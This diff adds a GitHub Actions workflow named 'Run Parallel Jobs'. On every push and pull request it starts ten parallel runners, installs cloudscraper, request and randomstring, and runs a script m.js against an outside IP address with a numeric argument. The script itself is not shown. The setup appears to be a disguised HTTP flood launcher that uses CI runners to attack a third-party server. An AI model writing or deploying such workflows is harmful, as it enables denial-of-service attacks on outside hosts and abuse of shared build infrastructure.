@@ -1,0 +1,31 @@
+name: Run Parallel Jobs
+on:
+  workflow_dispatch:  # Allows manual triggering
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  parallel-execution:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        # This creates 10 parallel jobs
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          
+      - name: Install dependencies
+        run: |
+          npm install cloudscraper request randomstring
+          
+      - name: Run Node script with parameters
+        run: |
+          node m.js http://45.131.65.145:8000/ 200
